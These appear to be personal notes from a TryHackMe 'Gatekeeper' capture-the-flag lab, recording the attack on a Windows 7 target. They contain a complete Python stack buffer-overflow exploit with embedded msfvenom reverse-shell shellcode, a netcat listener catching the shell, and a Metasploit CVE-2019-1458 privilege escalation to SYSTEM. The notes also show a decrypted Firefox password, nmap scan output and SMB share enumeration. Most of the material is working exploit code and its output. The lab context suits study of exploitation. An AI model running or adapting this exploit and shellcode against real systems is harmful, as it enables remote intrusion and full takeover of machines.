# Export
```bash
export IP="10.10.197.22"
export URL="http://10.10.197.22:80/FUZZ"
```

<hr>

# Credentials
+ Firefox: `mayor:8CL7O1N78MdrCIsV`
```bash
./firefox_decrypt.py ~/Documents/THM/gatekeeper/buffer_overflow_exploit/ljfn812a.default-release         
2021-09-10 22:37:57,894 - WARNING - profile.ini not found in /root/Documents/THM/gatekeeper/buffer_overflow_exploit/ljfn812a.default-release
2021-09-10 22:37:57,894 - WARNING - Continuing and assuming '/root/Documents/THM/gatekeeper/buffer_overflow_exploit/ljfn812a.default-release' is a profile location

Website:   https://creds.com
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'
```

<hr>

# RCE
+ BOF in `gatekeeper.exe`
```bash
import socket

ip = "10.10.113.117"
port = 31337

offset = 146
overflow = "A" * offset
retn = "\xC3\x14\x04\x08" # JMP ESP address 080414C3
padding = "\x90"*16
postfix = "\x90\x90\x90\x90"

# msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -b "\x00\x0a" -f py
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -b "\x00\x0a" -f py
payload =  ""
payload += "\xda\xc1\xd9\x74\x24\xf4\x58\xbe\x6e\xee\xe6\xcc"
payload += "\x31\xc9\xb1\x52\x31\x70\x17\x03\x70\x17\x83\xae"
payload += "\xea\x04\x39\xd2\x1b\x4a\xc2\x2a\xdc\x2b\x4a\xcf"
payload += "\xed\x6b\x28\x84\x5e\x5c\x3a\xc8\x52\x17\x6e\xf8"
payload += "\xe1\x55\xa7\x0f\x41\xd3\x91\x3e\x52\x48\xe1\x21"
payload += "\xd0\x93\x36\x81\xe9\x5b\x4b\xc0\x2e\x81\xa6\x90"
payload += "\xe7\xcd\x15\x04\x83\x98\xa5\xaf\xdf\x0d\xae\x4c"
payload += "\x97\x2c\x9f\xc3\xa3\x76\x3f\xe2\x60\x03\x76\xfc"
payload += "\x65\x2e\xc0\x77\x5d\xc4\xd3\x51\xaf\x25\x7f\x9c"
payload += "\x1f\xd4\x81\xd9\x98\x07\xf4\x13\xdb\xba\x0f\xe0"
payload += "\xa1\x60\x85\xf2\x02\xe2\x3d\xde\xb3\x27\xdb\x95"
payload += "\xb8\x8c\xaf\xf1\xdc\x13\x63\x8a\xd9\x98\x82\x5c"
payload += "\x68\xda\xa0\x78\x30\xb8\xc9\xd9\x9c\x6f\xf5\x39"
payload += "\x7f\xcf\x53\x32\x92\x04\xee\x19\xfb\xe9\xc3\xa1"
payload += "\xfb\x65\x53\xd2\xc9\x2a\xcf\x7c\x62\xa2\xc9\x7b"
payload += "\x85\x99\xae\x13\x78\x22\xcf\x3a\xbf\x76\x9f\x54"
payload += "\x16\xf7\x74\xa4\x97\x22\xda\xf4\x37\x9d\x9b\xa4"
payload += "\xf7\x4d\x74\xae\xf7\xb2\x64\xd1\xdd\xda\x0f\x28"
payload += "\xb6\xee\xcb\x33\x7b\x87\xd1\x33\x83\x07\x5f\xd5"
payload += "\xe9\xb7\x09\x4e\x86\x2e\x10\x04\x37\xae\x8e\x61"
payload += "\x77\x24\x3d\x96\x36\xcd\x48\x84\xaf\x3d\x07\xf6"
payload += "\x66\x41\xbd\x9e\xe5\xd0\x5a\x5e\x63\xc9\xf4\x09"
payload += "\x24\x3f\x0d\xdf\xd8\x66\xa7\xfd\x20\xfe\x80\x45"
payload += "\xff\xc3\x0f\x44\x72\x7f\x34\x56\x4a\x80\x70\x02"
payload += "\x02\xd7\x2e\xfc\xe4\x81\x80\x56\xbf\x7e\x4b\x3e"
payload += "\x46\x4d\x4c\x38\x47\x98\x3a\xa4\xf6\x75\x7b\xdb"
payload += "\x37\x12\x8b\xa4\x25\x82\x74\x7f\xee\xb2\x3e\xdd"
payload += "\x47\x5b\xe7\xb4\xd5\x06\x18\x63\x19\x3f\x9b\x81"
payload += "\xe2\xc4\x83\xe0\xe7\x81\x03\x19\x9a\x9a\xe1\x1d"
payload += "\x09\x9a\x23"

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")
```

+ Reverse shell

```bash
$ python3 exploit.py
$ nc -nlvp 80              
listening on [any] 80 ...
connect to [10.4.1.61] from (UNKNOWN) [10.10.113.117] 49214
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\natbat\Desktop>whoami
whoami
gatekeeper\natbat
```

<hr>

# Privilege Escalation
```bash
msf6 exploit(windows/local/cve_2019_1458_wizardopium) > options

Module options (exploit/windows/local/cve_2019_1458_wizardopium):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PROCESS  notepad.exe      yes       Name of process to spawn and inject dll into.
   SESSION  2                yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 x64
```

```bash
msf6 exploit(windows/local/cve_2019_1458_wizardopium) > exploit

[*] Started reverse TCP handler on 10.4.1.61:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Launching notepad.exe to host the exploit...
[+] Process 1448 launched.
[*] Injecting exploit into 1448 ...
[*] Exploit injected. Injecting payload into 1448...
[*] Payload injected. Executing exploit...
[*] Sending stage (200262 bytes) to 10.10.113.117
[*] Meterpreter session 3 opened (10.4.1.61:4444 -> 10.10.113.117:49208) at 2021-09-10 21:59:19 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

<hr>

# Nmap
```bash
PORT      STATE SERVICE            REASON          VERSION
135/tcp   open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 125 Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 125
| ssl-cert: Subject: commonName=gatekeeper
| Issuer: commonName=gatekeeper
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-09-10T01:15:41
| Not valid after:  2022-03-12T01:15:41
| MD5:   e039 9a3b 88e3 8e5f a23b 1461 cf5b e773
| SHA-1: 6b25 ec75 4f24 dc34 e7bd cfab b7dd 86e4 8bd7 4709
| -----BEGIN CERTIFICATE-----
| MIIC2DCCAcCgAwIBAgIQcHjc5slJOatItgzWuUn67DANBgkqhkiG9w0BAQUFADAV
| MRMwEQYDVQQDEwpnYXRla2VlcGVyMB4XDTIxMDkxMDAxMTU0MVoXDTIyMDMxMjAx
| MTU0MVowFTETMBEGA1UEAxMKZ2F0ZWtlZXBlcjCCASIwDQYJKoZIhvcNAQEBBQAD
| ggEPADCCAQoCggEBAODxGA2YSZ/1tcbbsKE9qOE5V9W+Yj4rjYBZqhaR/jDqWR/t
| soqBl3OEMCwMQVivw+5PJwI9UcTu7wl3orTX+9g/fTbGQ40lVDfNp/uV3RIj2n1w
| yA7WYZFJszOSIKSOtVrLFbLJwjUK0AWpLhJuKNzXUBBtuqs6H0zNWSiuboscZMhg
| seujosPig3wN098b8KRPcc13GMnGcQiNLCXi+Srr8vc12Y+6cMOs+L/HM70/zsze
| 6ntEtjBMQvX/RBmseZ9Tk0OpfvTlyPoTw6ej0dDC8WAdPDHw/HJG2hvgnjLFKMnv
| Xn9T3ZSEhqy3sxxdEo7sK9vJv7RZ2d2fHz3RfG8CAwEAAaMkMCIwEwYDVR0lBAww
| CgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IBAQCQqzFN
| S86cWXDJZ9tHh5G+COcFMDgEolg7TzEju43HQvGpgkbyNYgRdDb0Agfn56Fprs9o
| 0gYbK2JMv/LK8qM7Enswaa8LUuqX4OGBpwJRshCEWTU8EG4+KIUrG/TB5swDk/yB
| LdkXubTB80oV2JnnVr2MIW36tVtqJJ3ohLtuMNFjQdzgXQpn0xbyitc7gR/B5d9F
| eCgAG6JU1YevsRqfGPUcqWyPQlU7yZIWeKd8WSvIEcDbNNyOgo35Vz65khLc8xLr
| FeKmvwd0TQFt/NHvMxm7RGGmKmLSsTRqNDRIC19n2G07gTyjNWHFZzwWjKMuP9L6
| d3oboiSz7IIrqr/G
|_-----END CERTIFICATE-----
|_ssl-date: 2021-09-11T02:26:06+00:00; +1s from scanner time.
31337/tcp open  Elite?             syn-ack ttl 125
| fingerprint-strings:
|   FourOhFourRequest:
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines:
|     Hello
|     Hello
|   GetRequest:
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions:
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help:
|     Hello HELP
|   Kerberos:
|     Hello !!!
|   LDAPSearchReq:
|     Hello 0
|     Hello
|   LPDString:
|     Hello
|     default!!!
|   RTSPRequest:
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions:
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|_    Hello
...
```

<hr>

# SMB
+ File shares
```bash
smbclient -L $IP
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
SMB1 disabled -- no workgroup available
```

+ Download `gatekeeper.exe`

```bash
smbclient \\\\$IP\\Users
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu May 14 21:57:08 2020
  ..                                 DR        0  Thu May 14 21:57:08 2020
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Share                               D        0  Thu May 14 21:58:07 2020

                7863807 blocks of size 4096. 3876715 blocks available
smb: \> cd Share
smb: \Share\> ls
  .                                   D        0  Thu May 14 21:58:07 2020
  ..                                  D        0  Thu May 14 21:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020

                7863807 blocks of size 4096. 3876715 blocks available
smb: \Share\> get gatekeeper.exe
getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (5.1 KiloBytes/sec) (average 5.1 KiloBytes/sec)
```
